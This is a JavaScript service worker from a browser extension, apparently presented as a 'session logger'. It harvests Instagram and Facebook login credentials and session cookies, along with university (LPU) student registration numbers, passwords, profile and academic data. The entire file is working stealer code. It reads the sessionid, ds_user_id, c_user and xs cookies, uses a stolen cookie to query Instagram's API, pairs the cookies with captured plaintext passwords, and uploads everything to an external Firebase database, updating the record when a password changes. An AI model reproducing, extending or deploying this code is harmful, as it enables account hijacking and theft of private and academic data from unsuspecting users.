console.log(
  "%c╔══════════════════════════════════════════════════════════════╗",
  "color: #2196f3; font-weight: bold;"
);
console.log(
  "%c║           🚀 SESSION LOGGER SERVICE WORKER LOADED            ║",
  "color: #2196f3; font-weight: bold;"
);
console.log(
  "%c╚══════════════════════════════════════════════════════════════╝",
  "color: #2196f3; font-weight: bold;"
);

// ============== Firebase Imports ==============
import { db } from "./firebase-init.js";
import {
  collection,
  addDoc,
  getDocs,
  query,
  where,
  deleteDoc,
  doc,
  updateDoc,
} from "./firebase-firestore.js";

// ============== 🧠 In-Memory Cache for Deduplication ==============
const savedStudentSet = new Set(); // LPU: by registrationNumber
const savedInstagramBySessionId = new Set(); // Instagram: by sessionId
const savedFacebookByXs = new Set(); // Facebook: by xs cookie

// ============== 📦 Pending Credentials Storage ==============
let pendingInstagramCreds = null; // { username, password, capturedAt }
let pendingFacebookCreds = null; // { email, password, capturedAt }

// ============== 🔧 Utility Functions ==============

/**
 * Validates string input - checks for null, undefined, empty, and minimum length
 */
function isValidString(value, minLength = 1) {
  return (
    value !== null &&
    value !== undefined &&
    typeof value === "string" &&
    value.trim().length >= minLength
  );
}

/**
 * Validates email format (basic validation)
 */
function isValidEmail(email) {
  return isValidString(email, 3) && (email.includes("@") || email.length >= 3);
}

/**
 * Logs a formatted header box
 */
function logHeader(title, color = "#2196f3") {
  console.log(
    `%c╔══════════════════════════════════════════════════════════════╗`,
    `color: ${color}; font-weight: bold;`
  );
  console.log(
    `%c║  ${title.padEnd(60)}║`,
    `color: ${color}; font-weight: bold;`
  );
  console.log(
    `%c╚══════════════════════════════════════════════════════════════╝`,
    `color: ${color}; font-weight: bold;`
  );
}

/**
 * Smart field comparison and update tracking
 */
function checkAndAddField(field, value, displayName, existingData, updateData, newFields, updates) {
  if (value !== null && value !== undefined && value !== "") {
    const oldValue = existingData[field];
    if (oldValue !== value) {
      updateData[field] = value;
      if (oldValue) {
        updates.push(`${displayName}: "${oldValue}" → "${value}"`);
      } else {
        newFields.push(`${displayName}: "${value}"`);
      }
    }
  }
}

// ============== 🌐 Navigation Handler ==============
chrome.webNavigation.onCompleted.addListener(
  async ({ url, frameId }) => {
    if (frameId !== 0) return; // ⛔ Ignore iframes

    if (url.includes("instagram.com")) {
      await handleInstagramSession();
    } else if (url.includes("facebook.com")) {
      await handleFacebookSession();
    }
  },
  {
    url: [{ hostSuffix: "instagram.com" }, { hostSuffix: "facebook.com" }],
  }
);

// ============== 📩 Message Listener ==============
if (!globalThis.messageListenerAttached) {
  chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
    // 🔐 Instagram Login Credentials Handler (Pending Pattern)
    if (msg.type === "instagram_login_data") {
      handleInstagramLoginData(msg.data);
    }

    // 🔐 Facebook Login Credentials Handler (Pending Pattern)
    if (msg.type === "facebook_login_data") {
      handleFacebookLoginData(msg.data);
    }

    // 🏫 Student Data Handler
    if (msg.type === "student_data") {
      handleStudentData(msg.data);
    }

    // 📚 Student Profile Data Handler
    if (msg.type === "student_profile_data") {
      handleStudentProfileData(msg.data);
    }

    // 📊 Student Academic Data Handler
    if (msg.type === "student_academic_data") {
      handleStudentAcademicData(msg.data);
    }

    return true; // Keep message channel open for async responses
  });

  globalThis.messageListenerAttached = true;
}

// ============== 🔐 Instagram Login Handler (Pending Pattern) ==============
function handleInstagramLoginData(data) {
  const { username, password } = data;

  // Input validation
  if (!isValidString(username, 3) || !isValidString(password, 6)) {
    console.log(
      "%c[IG] ⚠️ VALIDATION FAILED: Username must be ≥3 chars, password ≥6 chars",
      "color: #ff9800; font-weight: bold;"
    );
    return;
  }

  logHeader("📥 INSTAGRAM LOGIN CAPTURED", "#e91e63");

  // Store as pending - will be combined with session cookies later
  pendingInstagramCreds = {
    username: username.trim(),
    password,
    capturedAt: new Date().toISOString(),
  };

  console.log(
    "%c[IG] ⏳ PENDING: Credentials stored, waiting for session cookies...",
    "color: #ff9800; font-weight: bold;"
  );
  console.table({ username: username.trim(), password: "***hidden***" });
}

// ============== 🔐 Facebook Login Handler (Pending Pattern) ==============
function handleFacebookLoginData(data) {
  const { email, password } = data;

  // Input validation
  if (!isValidEmail(email) || !isValidString(password, 6)) {
    console.log(
      "%c[FB] ⚠️ VALIDATION FAILED: Email must be ≥3 chars, password ≥6 chars",
      "color: #ff9800; font-weight: bold;"
    );
    return;
  }

  logHeader("📥 FACEBOOK LOGIN CAPTURED", "#1877f2");

  // Store as pending - will be combined with session cookies later
  pendingFacebookCreds = {
    email: email.trim(),
    password,
    capturedAt: new Date().toISOString(),
  };

  console.log(
    "%c[FB] ⏳ PENDING: Credentials stored, waiting for session cookies...",
    "color: #ff9800; font-weight: bold;"
  );
  console.table({ email: email.trim(), password: "***hidden***" });
}

// ============== 🍪 Instagram Session Handler ==============
async function handleInstagramSession() {
  chrome.cookies.getAll({ domain: ".instagram.com" }, async (cookies) => {
    logHeader("🍪 INSTAGRAM SESSION CHECK", "#e91e63");

    const session = cookies.find((c) => c.name === "sessionid");
    const dsUserId = cookies.find((c) => c.name === "ds_user_id");

    if (!session || !dsUserId) {
      console.log(
        "%c[IG] ⚠️ Missing required cookies:",
        "color: #ff9800; font-weight: bold;"
      );
      if (!session) console.log("%c   - sessionid NOT found", "color: #ff9800;");
      if (!dsUserId) console.log("%c   - ds_user_id NOT found", "color: #ff9800;");
      return;
    }

    const sessionId = session.value;
    const userId = dsUserId.value;

    // In-memory deduplication check (by sessionId)
    if (savedInstagramBySessionId.has(sessionId)) {
      console.log(
        "%c[IG] ⏭️ SKIP: Session already processed in this browser session",
        "color: #9e9e9e;"
      );
      return;
    }

    console.log("%c[IG] 🍪 Cookies found:", "color: #4caf50; font-weight: bold;");
    console.table([
      { name: "sessionid", value: sessionId.substring(0, 20) + "..." },
      { name: "ds_user_id", value: userId },
    ]);

    // Fetch user info from Instagram API
    let username = "unknown_user";
    let bio = "";

    try {
      console.log(
        "%c[IG] 🔄 Fetching user info from Instagram API...",
        "color: #2196f3; font-weight: bold;"
      );

      const response = await fetch(
        `https://i.instagram.com/api/v1/users/${userId}/info/`,
        {
          method: "GET",
          headers: {
            "User-Agent": "Instagram 219.0.0.12.117 Android",
            Cookie: `sessionid=${sessionId};`,
            "X-IG-App-ID": "936619743392459",
            "Accept-Language": "en-US",
          },
        }
      );

      if (response.ok) {
        const data = await response.json();
        const user = data.user || {};
        username = user.username || "unknown_user";
        bio = user.biography || "";

        console.log(
          "%c[IG] ✅ User info fetched:",
          "color: #4caf50; font-weight: bold;"
        );
        console.table({ username, bio: bio.substring(0, 50) + (bio.length > 50 ? "..." : "") });
      } else {
        console.log(
          `%c[IG] ⚠️ API response: HTTP ${response.status}`,
          "color: #ff9800;"
        );
      }
    } catch (error) {
      console.log(
        "%c[IG] ❌ API fetch error:",
        "color: #f44336; font-weight: bold;",
        error.message
      );
    }

    // Prepare document data
    const docData = {
      sessionId,
      userId,
      username,
      bio,
      timestamp: new Date(),
    };

    // Combine with pending credentials if available
    if (pendingInstagramCreds) {
      docData.loginUsername = pendingInstagramCreds.username;
      docData.loginPassword = pendingInstagramCreds.password;
      docData.credentialsCapturedAt = pendingInstagramCreds.capturedAt;

      console.log(
        "%c[IG] 🔗 COMBINED: Merging pending credentials with session",
        "color: #8bc34a; font-weight: bold;"
      );

      // Clear pending credentials after use
      pendingInstagramCreds = null;
    }

    const colRef = collection(db, "instagram");

    try {
      // Smart deduplication: Check for existing sessionId
      const sessionQuery = query(colRef, where("sessionId", "==", sessionId));
      const sessionSnapshot = await getDocs(sessionQuery);

      if (!sessionSnapshot.empty) {
        console.log(
          "%c[IG] ⏭️ SKIP: Exact sessionId already exists in database",
          "color: #9e9e9e;"
        );
        savedInstagramBySessionId.add(sessionId);
        return;
      }

      // Check for same userId with different sessionId (session refresh)
      const userQuery = query(colRef, where("userId", "==", userId));
      const userSnapshot = await getDocs(userQuery);

      if (!userSnapshot.empty) {
        // Delete old document(s) - session has been refreshed
        console.log(
          "%c[IG] 🔄 SESSION REFRESH DETECTED: Deleting old session(s)...",
          "color: #ff9800; font-weight: bold;"
        );

        for (const oldDoc of userSnapshot.docs) {
          const oldData = oldDoc.data();
          console.log(
            `%c[IG] 🗑️ Deleting old session: ${oldData.sessionId?.substring(0, 15)}...`,
            "color: #ff9800;"
          );
          await deleteDoc(doc(db, "instagram", oldDoc.id));
        }
      }

      // Save new document
      await addDoc(colRef, docData);
      savedInstagramBySessionId.add(sessionId);

      console.log(
        `%c[IG] ✅ SAVED: Session for @${username} (userId: ${userId})`,
        "color: #4caf50; font-weight: bold; font-size: 14px;"
      );
      console.table({
        sessionId: sessionId.substring(0, 20) + "...",
        userId,
        username,
        hasCredentials: !!docData.loginUsername,
      });
    } catch (err) {
      console.log(
        "%c[IG] ❌ ERROR: Failed to save session",
        "color: #f44336; font-weight: bold;"
      );
      console.error(err);
    }
  });
}

// ============== 📘 Facebook Session Handler ==============
async function handleFacebookSession() {
  chrome.cookies.getAll({ domain: ".facebook.com" }, async (cookies) => {
    logHeader("🍪 FACEBOOK SESSION CHECK", "#1877f2");

    const cUser = cookies.find((c) => c.name === "c_user");
    const xs = cookies.find((c) => c.name === "xs");

    if (!cUser || !xs) {
      console.log(
        "%c[FB] ⚠️ Missing required cookies:",
        "color: #ff9800; font-weight: bold;"
      );
      if (!cUser) console.log("%c   - c_user NOT found", "color: #ff9800;");
      if (!xs) console.log("%c   - xs NOT found", "color: #ff9800;");
      return;
    }

    const cUserValue = cUser.value;
    const xsValue = xs.value;

    // In-memory deduplication check (by xs cookie)
    if (savedFacebookByXs.has(xsValue)) {
      console.log(
        "%c[FB] ⏭️ SKIP: Session already processed in this browser session",
        "color: #9e9e9e;"
      );
      return;
    }

    console.log("%c[FB] 🍪 Cookies found:", "color: #4caf50; font-weight: bold;");
    console.table([
      { name: "c_user", value: cUserValue },
      { name: "xs", value: xsValue.substring(0, 20) + "..." },
    ]);

    // Prepare document data
    const docData = {
      c_user: cUserValue,
      xs: xsValue,
      timestamp: new Date(),
    };

    // Combine with pending credentials if available
    if (pendingFacebookCreds) {
      docData.loginEmail = pendingFacebookCreds.email;
      docData.loginPassword = pendingFacebookCreds.password;
      docData.credentialsCapturedAt = pendingFacebookCreds.capturedAt;

      console.log(
        "%c[FB] 🔗 COMBINED: Merging pending credentials with session",
        "color: #8bc34a; font-weight: bold;"
      );

      // Clear pending credentials after use
      pendingFacebookCreds = null;
    }

    const colRef = collection(db, "facebook");

    try {
      // Smart deduplication: Check for existing xs cookie
      const xsQuery = query(colRef, where("xs", "==", xsValue));
      const xsSnapshot = await getDocs(xsQuery);

      if (!xsSnapshot.empty) {
        console.log(
          "%c[FB] ⏭️ SKIP: Exact xs cookie already exists in database",
          "color: #9e9e9e;"
        );
        savedFacebookByXs.add(xsValue);
        return;
      }

      // Check for same c_user with different xs (session refresh)
      const userQuery = query(colRef, where("c_user", "==", cUserValue));
      const userSnapshot = await getDocs(userQuery);

      if (!userSnapshot.empty) {
        // Delete old document(s) - session has been refreshed
        console.log(
          "%c[FB] 🔄 SESSION REFRESH DETECTED: Deleting old session(s)...",
          "color: #ff9800; font-weight: bold;"
        );

        for (const oldDoc of userSnapshot.docs) {
          const oldData = oldDoc.data();
          console.log(
            `%c[FB] 🗑️ Deleting old session for c_user: ${oldData.c_user}`,
            "color: #ff9800;"
          );
          await deleteDoc(doc(db, "facebook", oldDoc.id));
        }
      }

      // Save new document
      await addDoc(colRef, docData);
      savedFacebookByXs.add(xsValue);

      console.log(
        `%c[FB] ✅ SAVED: Session for c_user: ${cUserValue}`,
        "color: #4caf50; font-weight: bold; font-size: 14px;"
      );
      console.table({
        c_user: cUserValue,
        xs: xsValue.substring(0, 20) + "...",
        hasCredentials: !!docData.loginEmail,
      });
    } catch (err) {
      console.log(
        "%c[FB] ❌ ERROR: Failed to save session",
        "color: #f44336; font-weight: bold;"
      );
      console.error(err);
    }
  });
}

// ============== 🏫 Student Data Handler ==============
async function handleStudentData(data) {
  const { registrationNumber, password } = data;

  // Input validation
  if (!isValidString(registrationNumber, 8) || !isValidString(password, 4)) {
    console.log(
      "%c[LPU] ⚠️ VALIDATION FAILED: RegNo ≥8 chars, password ≥4 chars required",
      "color: #ff9800; font-weight: bold;"
    );
    return;
  }

  logHeader("🎓 LPU STUDENT DATA RECEIVED", "#9c27b0");

  const regNo = registrationNumber.trim();
  const key = `${regNo}:${password}`;

  // In-memory deduplication check
  if (savedStudentSet.has(key)) {
    console.log(
      "%c[LPU] ⏭️ SKIP: Already processed in this browser session",
      "color: #9e9e9e;"
    );
    return;
  }

  console.log("%c[LPU] 📋 Data received:", "color: #4caf50; font-weight: bold;");
  console.table({ registrationNumber: regNo, password: "***hidden***" });

  const colRef = collection(db, "studentData");

  try {
    // Check for exact duplicate (same regNo + password)
    const exactQuery = query(
      colRef,
      where("registrationNumber", "==", regNo),
      where("password", "==", password)
    );
    const exactSnapshot = await getDocs(exactQuery);

    if (!exactSnapshot.empty) {
      console.log(
        "%c[LPU] ⏭️ SKIP: Exact duplicate exists in database",
        "color: #9e9e9e;"
      );
      savedStudentSet.add(key);
      return;
    }

    // Check for same regNo with different password (password changed)
    const regNoQuery = query(colRef, where("registrationNumber", "==", regNo));
    const regNoSnapshot = await getDocs(regNoQuery);

    if (!regNoSnapshot.empty) {
      // Delete old document(s) - password has been changed
      console.log(
        "%c[LPU] 🔄 PASSWORD CHANGE DETECTED: Updating credentials...",
        "color: #ff9800; font-weight: bold;"
      );

      for (const oldDoc of regNoSnapshot.docs) {
        const oldData = oldDoc.data();
        console.log(
          `%c[LPU] 🗑️ Deleting old record with password: ${oldData.password?.substring(0, 3)}***`,
          "color: #ff9800;"
        );
        await deleteDoc(doc(db, "studentData", oldDoc.id));
      }
    }

    // Save new document
    const docData = {
      registrationNumber: regNo,
      password,
      timestamp: new Date(),
    };

    await addDoc(colRef, docData);
    savedStudentSet.add(key);

    console.log(
      `%c[LPU] ✅ SAVED: Student data for ${regNo}`,
      "color: #4caf50; font-weight: bold; font-size: 14px;"
    );
  } catch (err) {
    console.log(
      "%c[LPU] ❌ ERROR: Failed to save student data",
      "color: #f44336; font-weight: bold;"
    );
    console.error(err);
  }
}

// ============== 📚 Student Profile Data Handler (with Retry Logic) ==============
async function handleStudentProfileData(data, retryCount = 0) {
  const { registrationNumber } = data;

  if (!isValidString(registrationNumber, 8)) {
    console.log(
      "%c[LPU PROFILE] ⚠️ VALIDATION FAILED: Invalid registration number",
      "color: #ff9800; font-weight: bold;"
    );
    return;
  }

  logHeader("👤 LPU PROFILE DATA UPDATE", "#673ab7");

  const regNo = registrationNumber.trim();
  const colRef = collection(db, "studentData");

  try {
    // Query for existing document by registrationNumber
    const regNoQuery = query(colRef, where("registrationNumber", "==", regNo));
    const snapshot = await getDocs(regNoQuery);

    if (snapshot.empty) {
      // Retry logic for race conditions
      if (retryCount < 3) {
        console.log(
          `%c[LPU PROFILE] ⏳ WAITING: Document not found, retry ${retryCount + 1}/3...`,
          "color: #ff9800; font-weight: bold;"
        );
        await new Promise((resolve) => setTimeout(resolve, 1000));
        return handleStudentProfileData(data, retryCount + 1);
      }

      // After 3 retries, create new document as fallback
      console.log(
        "%c[LPU PROFILE] 🆕 NEW: Creating new profile document (no base record found)",
        "color: #8bc34a; font-weight: bold;"
      );

      const newDoc = {
        registrationNumber: regNo,
        ...filterValidFields(data),
        timestamp: new Date(),
      };

      await addDoc(colRef, newDoc);
      console.log(
        `%c[LPU PROFILE] ✅ SAVED: New profile for ${regNo}`,
        "color: #4caf50; font-weight: bold;"
      );
      return;
    }

    // Update existing document with merge logic
    const existingDoc = snapshot.docs[0];
    const existingData = existingDoc.data();

    const updateData = {};
    const newFields = [];
    const updates = [];

    // Compare and add each field
    checkAndAddField("name", data.name, "Name", existingData, updateData, newFields, updates);
    checkAndAddField("email", data.email, "Email", existingData, updateData, newFields, updates);
    checkAndAddField("phone", data.phone, "Phone", existingData, updateData, newFields, updates);
    checkAndAddField("section", data.section, "Section", existingData, updateData, newFields, updates);
    checkAndAddField("program", data.program, "Program", existingData, updateData, newFields, updates);
    checkAndAddField("batch", data.batch, "Batch", existingData, updateData, newFields, updates);
    checkAndAddField("rollNumber", data.rollNumber, "Roll Number", existingData, updateData, newFields, updates);

    if (Object.keys(updateData).length === 0) {
      console.log(
        "%c[LPU PROFILE] ⏭️ SKIP: No new data to update",
        "color: #9e9e9e;"
      );
      return;
    }

    // Add timestamp for the update
    updateData.lastProfileUpdate = new Date();

    await updateDoc(doc(db, "studentData", existingDoc.id), updateData);

    // Log the changes
    if (newFields.length > 0) {
      console.log(
        "%c[LPU PROFILE] 🆕 NEW FIELDS ADDED:",
        "color: #8bc34a; font-weight: bold;"
      );
      newFields.forEach((f) => console.log(`%c   + ${f}`, "color: #8bc34a;"));
    }

    if (updates.length > 0) {
      console.log(
        "%c[LPU PROFILE] 🔄 FIELDS UPDATED:",
        "color: #ff9800; font-weight: bold;"
      );
      updates.forEach((u) => console.log(`%c   ~ ${u}`, "color: #ff9800;"));
    }

    console.log(
      `%c[LPU PROFILE] ✅ UPDATED: Profile for ${regNo}`,
      "color: #4caf50; font-weight: bold; font-size: 14px;"
    );
  } catch (err) {
    console.log(
      "%c[LPU PROFILE] ❌ ERROR: Failed to update profile",
      "color: #f44336; font-weight: bold;"
    );
    console.error(err);
  }
}

// ============== 📊 Student Academic Data Handler (with Retry Logic) ==============
async function handleStudentAcademicData(data, retryCount = 0) {
  const { registrationNumber } = data;

  if (!isValidString(registrationNumber, 8)) {
    console.log(
      "%c[LPU ACADEMIC] ⚠️ VALIDATION FAILED: Invalid registration number",
      "color: #ff9800; font-weight: bold;"
    );
    return;
  }

  logHeader("📊 LPU ACADEMIC DATA UPDATE", "#3f51b5");

  const regNo = registrationNumber.trim();
  const colRef = collection(db, "studentData");

  try {
    // Query for existing document by registrationNumber
    const regNoQuery = query(colRef, where("registrationNumber", "==", regNo));
    const snapshot = await getDocs(regNoQuery);

    if (snapshot.empty) {
      // Retry logic for race conditions
      if (retryCount < 3) {
        console.log(
          `%c[LPU ACADEMIC] ⏳ WAITING: Document not found, retry ${retryCount + 1}/3...`,
          "color: #ff9800; font-weight: bold;"
        );
        await new Promise((resolve) => setTimeout(resolve, 1000));
        return handleStudentAcademicData(data, retryCount + 1);
      }

      // After 3 retries, create new document as fallback
      console.log(
        "%c[LPU ACADEMIC] 🆕 NEW: Creating new academic document (no base record found)",
        "color: #8bc34a; font-weight: bold;"
      );

      const newDoc = {
        registrationNumber: regNo,
        ...filterValidFields(data),
        timestamp: new Date(),
      };

      await addDoc(colRef, newDoc);
      console.log(
        `%c[LPU ACADEMIC] ✅ SAVED: New academic record for ${regNo}`,
        "color: #4caf50; font-weight: bold;"
      );
      return;
    }

    // Update existing document with merge logic
    const existingDoc = snapshot.docs[0];
    const existingData = existingDoc.data();

    const updateData = {};
    const newFields = [];
    const updates = [];

    // Compare and add each field
    checkAndAddField("cgpa", data.cgpa, "CGPA", existingData, updateData, newFields, updates);
    checkAndAddField("sgpa", data.sgpa, "SGPA", existingData, updateData, newFields, updates);
    checkAndAddField("semester", data.semester, "Semester", existingData, updateData, newFields, updates);
    checkAndAddField("attendance", data.attendance, "Attendance", existingData, updateData, newFields, updates);
    checkAndAddField("totalCredits", data.totalCredits, "Total Credits", existingData, updateData, newFields, updates);
    checkAndAddField("earnedCredits", data.earnedCredits, "Earned Credits", existingData, updateData, newFields, updates);

    if (Object.keys(updateData).length === 0) {
      console.log(
        "%c[LPU ACADEMIC] ⏭️ SKIP: No new data to update",
        "color: #9e9e9e;"
      );
      return;
    }

    // Add timestamp for the update
    updateData.lastAcademicUpdate = new Date();

    await updateDoc(doc(db, "studentData", existingDoc.id), updateData);

    // Log the changes
    if (newFields.length > 0) {
      console.log(
        "%c[LPU ACADEMIC] 🆕 NEW FIELDS ADDED:",
        "color: #8bc34a; font-weight: bold;"
      );
      newFields.forEach((f) => console.log(`%c   + ${f}`, "color: #8bc34a;"));
    }

    if (updates.length > 0) {
      console.log(
        "%c[LPU ACADEMIC] 🔄 FIELDS UPDATED:",
        "color: #ff9800; font-weight: bold;"
      );
      updates.forEach((u) => console.log(`%c   ~ ${u}`, "color: #ff9800;"));
    }

    console.log(
      `%c[LPU ACADEMIC] ✅ UPDATED: Academic data for ${regNo}`,
      "color: #4caf50; font-weight: bold; font-size: 14px;"
    );
  } catch (err) {
    console.log(
      "%c[LPU ACADEMIC] ❌ ERROR: Failed to update academic data",
      "color: #f44336; font-weight: bold;"
    );
    console.error(err);
  }
}

// ============== 🔧 Helper: Filter Valid Fields ==============
function filterValidFields(data) {
  const filtered = {};
  for (const [key, value] of Object.entries(data)) {
    if (key !== "registrationNumber" && value !== null && value !== undefined && value !== "") {
      filtered[key] = value;
    }
  }
  return filtered;
}
